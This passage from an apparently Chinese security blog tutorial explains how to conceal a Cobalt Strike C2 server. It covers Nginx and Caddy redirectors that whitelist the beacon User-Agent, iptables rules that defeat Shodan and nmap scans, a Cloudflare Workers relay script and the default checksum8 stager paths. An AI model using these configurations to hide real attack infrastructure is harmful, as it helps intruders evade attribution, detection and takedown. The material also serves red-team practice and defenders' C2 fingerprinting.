+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117161405595.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117161405595"></p>
+<p>生成beacon测试，成功上线：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117161516406.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117161516406"></p>
+<h2 id="补充1"><a href="#补充1" class="headerlink" title="补充1"></a>补充1</h2><p>有的师傅443端口是有用处的，需要改成其他的端口。这里需要注意的是免费版的Cloudflare对代理的端口有限制。我们只能成如下端口：</p>
+<ul>
+<li>http：80、8080、8880、2052、2082、2086、2095</li>
+<li>https：443、2053、2083、2087、2096、8443</li>
+</ul>
+<h2 id="补充2"><a href="#补充2" class="headerlink" title="补充2"></a>补充2</h2><p>​	以上针对的是https的beacon，http的话在DNS中加一个二级域名并使用该二级域名上线即可。不用额外再弄一个profile，因为http的beacon只看域名。 在http的raw payload中我们可以验证这一点：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117165510460.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117165510460"></p>
+<p>对比https的raw payload，它用上了我们之前配置的所有内容：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117165725500.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117165725500"></p>
+<h1 id="0x05-高级方案：反向代理（http-x2F-https）与Cloudflare-Workers"><a href="#0x05-高级方案：反向代理（http-x2F-https）与Cloudflare-Workers" class="headerlink" title="0x05 高级方案：反向代理（http&#x2F;https）与Cloudflare Workers"></a>0x05 高级方案：反向代理（http&#x2F;https）与Cloudflare Workers</h1><p>其实原本这一切就已经结束了。但是在我倒腾完的第n天早上收了一个邮件。大意是说我违反了政策，然后让我去主机管理面板看细节。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117171338915.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117171338915"></p>
+<p>细节的内容已经找不到了，但大体是说你的服务器与一个攻击行为有关。然后给我丢了一个shodan的链接。我点进去一看，好家伙，给我分析得明明白白，直接扒光了。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117171705824.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117171705824"></p>
+<p>我尝试理解了一下发生了什么，发现无法理解。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/8EB9DC8DF847CD3D4A79F69D245DF38D.jpg" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="img"></p>
+<p>然后查了一下资料，具体就是CS的stage马上线时，默认会向一个符合checksum8规则的路径发起请求，随后服务器会响应各种Payload数据。checksum8规则路径大概就长这样：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/x9cI/</span><br><span class="hljs-regexp">/fYKR/</span><br><span class="hljs-regexp">/Mrm0/</span><br><span class="hljs-regexp">/wQPD/</span><br><span class="hljs-regexp">/yDHX/</span><br><span class="hljs-regexp">/BCre/</span><br><span class="hljs-regexp">/WHVh/</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>​	然后，虽然我们在Profile中配置了URI，但是默认的URI并没有失效。该默认URI依旧可以执行下发任务，上线等一系列操作。我拿nmap脚本跑了一下，发现确实被扒光了。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117174748538.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117174748538"></p>
+<p>​	解决方案的话也有，一个是用二进制手段对CS源码进行改造。一个是使用反向代理服务器禁用这个checksum8规则路径。由于不会二进制，这里我选择第二种方案。</p>
+<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>​	反向代理选的套件看了看网上都是清一色的Nginx，不过这回为了兼容某些应用我使用了Caddy。Caddy的好处是配置简单，不像Nginx的配置看起来头大。不过我同样对Nginx进行了测试，最后无论是Nginx还是Caddy都能成功上线。</p>
+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>可以使用 <a target="_blank" rel="noopener" href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a> 提供的脚本生成：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ./cs2nginx.py -i havex.profile -c https://127.0.0.1:8443 -r https://www.baidu.com -H cdn.xxxx.club<br></code></pre></td></tr></table></figure>
+
+<p>对各个参数进行说明，如下</p>
+<ul>
+<li>-i 为模板文件，这个固定的，可以不用管。</li>
+<li>-c 为后端CS绑定的端口，这个会在后面CS的配置中有所体现</li>
+<li>-r 为不合要求的访问302重定向去的位置，这里填了百度</li>
+<li>-H 为你的域名，这里就是你配的那个</li>
+</ul>
+<p>在配置完后，需要配置ssl证书：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#####################</span><br><span class="hljs-comment"># SSL Configuration</span><br><span class="hljs-comment">#####################</span><br><span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br><span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br><span class="hljs-attribute">ssl</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-attribute">ssl_certificate</span> /root/tool/CS/https/server.pem; <span class="hljs-comment"># 改这个</span><br><span class="hljs-attribute">ssl_certificate_key</span> /root/tool/CS/https/server.key; <span class="hljs-comment"># 改这个</span><br><span class="hljs-attribute">ssl_session_cache</span> shared:le_nginx_SSL:<span class="hljs-number">1m</span>; <span class="hljs-comment"># managed by Certbot</span><br><span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">1440m</span>; <span class="hljs-comment"># managed by Certbot</span><br><span class="hljs-attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>; <span class="hljs-comment"># managed by Certbot</span><br><span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>; <span class="hljs-comment"># managed by Certbot</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>​	同时的话还可以定制化处理location块，使得只有指定URL才能访问，保证了不会被扫到。指定User-Agent可以确保的都是Beacon而不是其他的奇怪的东西，有点白名单的意思了。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ ^(/jquery-3\.3\.1\.slim\.min\.js|/jquery-3\.3\.2\.min\.js|/jquery-3\.3\.1\.min\.js|/jquery-3\.3\.2\.slim\.min\.js)$</span> &#123;<br>        <span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_user_agent</span> != <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span>) &#123;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">302</span> <span class="hljs-variable">$REDIRECT_DOMAIN</span><span class="hljs-variable">$request_uri</span>;<br>        &#125;<br>        <span class="hljs-attribute">proxy_pass</span>          <span class="hljs-variable">$C2_SERVER</span>;<br><br>        <span class="hljs-comment"># If you want to pass the C2 server&#x27;s &quot;Server&quot; header through then uncomment this line</span><br>        <span class="hljs-comment"># proxy_pass_header Server;</span><br>        <span class="hljs-attribute">expires</span>             <span class="hljs-literal">off</span>;<br>        <span class="hljs-attribute">proxy_redirect</span>      <span class="hljs-literal">off</span>;<br>        <span class="hljs-attribute">proxy_set_header</span>    Host                <span class="hljs-variable">$host</span>;<br>        <span class="hljs-attribute">proxy_set_header</span>    X-Forwarded-For     <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        <span class="hljs-attribute">proxy_set_header</span>    X-Real-IP           <span class="hljs-variable">$remote_addr</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​	这里还要注意的是这里的Nginx宜以root权限运行，默认生成的文件是www-data用户。使用该用户<strong>可能</strong>会有权限问题，这也是大多数人使用反向代理后https无法上线的原因。当然最重要的还是要学会看Nginx错误日志，至少能定位到问题在哪：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117201414251.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117201414251"></p>
+<p>​	当时我是报了一个<code>(13: Permission denied) while reading upstream</code>的错误，改成root运行Nginx后就好了，但现在重新用回www-data后也不报错了。。 推测是某些临时文件的属主变了吧。</p>
+<p>​	该配置经过测试能够成功上线，CS配置如下。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117204625059.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117204625059"></p>
+<h3 id="Caddy"><a href="#Caddy" class="headerlink" title="Caddy"></a>Caddy</h3><p>caddy的配置就简单的多，这里直接贴配置文件。没有Caddy可以装一个：</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> caddy<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>caddy/Caddyfile<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs groovy">cdn.xxxx.club &#123;<br>        tls <span class="hljs-regexp">/root/</span>tool<span class="hljs-regexp">/CS/</span>https<span class="hljs-regexp">/server.pem /</span>root<span class="hljs-regexp">/tool/</span>CS<span class="hljs-regexp">/https/</span>server.key<br>        reverse_proxy <span class="hljs-regexp">/jquery-3.3* https:/</span>/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8443</span> &#123;<br>               transport http &#123;<br>                        tls<br>                        tls_insecure_skip_verify<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>这里说明一下各个主要指令的作用：</p>
+<ul>
+<li>最外面的tls：启用tls连接，这里的tls连接是指下游连接，即和Cloudflare的CDN服务器的连接。证书和秘钥是Cloudflare给的那个。</li>
+<li>reverse_proxy：反向代理。</li>
+<li>里面的tls：同样是使用tls连接。</li>
+<li>tls_insecure_skip_verify：我们使用的生成keystore的证书同样是Cloudflare签发的那个，这里的tls连接是Caddy和CS服务器的连接，由于Cloudflare签发的证书是不受（除Cloudflare以外的机构）信任的，亦即该证书在Caddy看来是不受信任的，连接是不安全的。我们需要加上tls_insecure_skip_verify指定，否则Caddy将在握手阶段就终止该https连接。并报不受信任的证书错误。</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2021</span>/<span class="hljs-number">11</span>/<span class="hljs-number">16</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">01</span>.<span class="hljs-number">975</span> ERROR   http.log.error  x509: cannot validate certificate for <span class="hljs-number">127.0.0.1</span> because it doesn&#x27;t contain any IP SANs<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>​	该配置经过测试能够成功上线。CS配置和nginx中所提到的相同</p>
+<h3 id="配置Iptables"><a href="#配置Iptables" class="headerlink" title="配置Iptables"></a>配置Iptables</h3><p>我们的listener监听的是0.0.0.0，我们应该配置成只能让反向代理套件访问。否则像shodan这样的搜索引擎或者我们自己拿nmap脚本去扫端口的话依旧能够分析出beacon信息。可以使用如下命令配置iptables，要是云厂商提供防火墙的话也可以在那边的防火墙进行配置。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8443</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8443</span> -j DROP<br><br>iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8880</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8880</span> -j DROP<br></code></pre></td></tr></table></figure>
+
+
+
+<p>现在再拿脚本进行测试的话，就发现扫不出任何东西了：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205132545.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117205132545"></p>
+<h2 id="Cloudflare-Workers"><a href="#Cloudflare-Workers" class="headerlink" title="Cloudflare Workers"></a>Cloudflare Workers</h2><p>这个有点类似域前置，但是有域前置还是用域前置的好。使用Cloudflare Workers可以隐藏我们的真实域名。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205312256.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117205312256"></p>
+<p>申请好子域后创建服务：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205428095.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117205428095"></p>
+<p>创建好服务后点击快速编辑：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205533744.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117205533744"></p>
+<p>并粘贴如下脚本：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> upstream = <span class="hljs-string">&#x27;https://cdn.xxxx.club&#x27;</span> # 这里写你的域名<br><br><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>    event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">fetchAndApply</span>(event.<span class="hljs-property">request</span>));<br>&#125;)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchAndApply</span>(<span class="hljs-params">request</span>) &#123;<br>    <span class="hljs-keyword">const</span> ipAddress = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;cf-connecting-ip&#x27;</span>) || <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">let</span> requestURL = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>);<br>    <span class="hljs-keyword">let</span> upstreamURL = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(upstream);<br>    requestURL.<span class="hljs-property">protocol</span> = upstreamURL.<span class="hljs-property">protocol</span>;<br>    requestURL.<span class="hljs-property">host</span> = upstreamURL.<span class="hljs-property">host</span>;<br>    requestURL.<span class="hljs-property">pathname</span> = upstreamURL.<span class="hljs-property">pathname</span> + requestURL.<span class="hljs-property">pathname</span>;<br><br>    <span class="hljs-keyword">let</span> new_request_headers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>(request.<span class="hljs-property">headers</span>);<br>    new_request_headers.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>, ipAddress);<br>    <span class="hljs-keyword">let</span> fetchedResponse = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(requestURL, &#123;<br>            <span class="hljs-attr">method</span>: request.<span class="hljs-property">method</span>,<br>            <span class="hljs-attr">headers</span>: new_request_headers,<br>            <span class="hljs-attr">body</span>: request.<span class="hljs-property">body</span><br>        &#125;)<br>    );<br>    <span class="hljs-keyword">let</span> modifiedResponseHeaders = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>(fetchedResponse.<span class="hljs-property">headers</span>);<br>    modifiedResponseHeaders.<span class="hljs-title function_">delete</span>(<span class="hljs-string">&#x27;set-cookie&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<br>        fetchedResponse.<span class="hljs-property">body</span>,<br>        &#123;<br>            <span class="hljs-attr">headers</span>: modifiedResponseHeaders,<br>            <span class="hljs-attr">status</span>: fetchedResponse.<span class="hljs-property">status</span>,<br>            <span class="hljs-attr">statusText</span>: fetchedResponse.<span class="hljs-property">statusText</span><br>        &#125;<br>    );<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>之后使用右侧的域名替换CS中https beacon的三个域名即可：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205733591.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117205733591"></p>
+<p>​	经过测试能够成功上线。</p>
+<h1 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h1><p>参考文献：</p>
+<p><a target="_blank" rel="noopener" href="https://myzxcg.com/2020/12/Cobalt-Strike%E5%8E%BB%E7%89%B9%E5%BE%81%E9%85%8D%E7%BD%AENginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86CDN%E4%B8%8ECloudflare-Worker/">https://myzxcg.com/2020/12/Cobalt-Strike%E5%8E%BB%E7%89%B9%E5%BE%81%E9%85%8D%E7%BD%AENginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86CDN%E4%B8%8ECloudflare-Worker/</a></p>
+<p><a target="_blank" rel="noopener" href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/">https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</a></p>
+<p>文章也同步到了我的个人博客，师傅们也可以来<a href="https://m0ck1ng-b1rd.github.io/">瞅瞅</a>…</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/Tools/" class="category-chain-item">Tools</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/Tools/CS/" class="category-chain-item">CS</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/%E6%8A%95%E7%A8%BF/">#投稿</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度</div>
+      <div>https://m0ck1ng-b1rd.github.io/2022/04/13/APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年4月13日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox - Shibboleth</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%201%20-%20%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B/" title="PETOOL开发日记1 - 进程查看">
+                        <span class="hidden-mobile">PETOOL开发日记1 - 进程查看</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
